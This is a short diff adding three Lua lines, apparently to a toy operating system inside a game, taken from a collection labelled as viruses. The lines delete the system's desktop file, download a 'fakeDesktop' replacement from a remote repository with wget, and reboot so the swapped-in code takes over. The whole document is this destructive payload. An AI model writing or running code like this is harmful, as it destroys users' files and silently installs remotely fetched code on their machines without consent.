@@ -1,1 +1,3 @@
-
+fs.delete("rOS/desktop")
+shell.run("wget https://raw.githubusercontent.com/Raven0S/RavenOS-2.0/master/rViruses/Virus%201/fakeDesktop rOS/desktop")
+os.reboot()
